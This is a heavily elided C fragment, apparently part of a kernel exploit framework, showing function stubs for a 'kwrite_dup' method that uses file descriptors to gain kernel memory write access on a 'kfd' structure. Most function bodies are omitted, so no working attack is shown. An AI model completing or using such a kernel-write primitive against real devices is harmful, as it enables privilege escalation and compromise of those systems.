...
static inline void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

static inline void kwrite_dup_init(struct kfd* kfd)
{
...
static inline void kwrite_dup_allocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
...
static inline bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
{
...
static inline void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_dup_kwrite_u64);
}

static inline void kwrite_dup_find_proc(struct kfd* kfd)
{
    /*
...
static inline void kwrite_dup_deallocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    assert_bsd(close(fds[id]));
}

static inline void kwrite_dup_free(struct kfd* kfd)
{
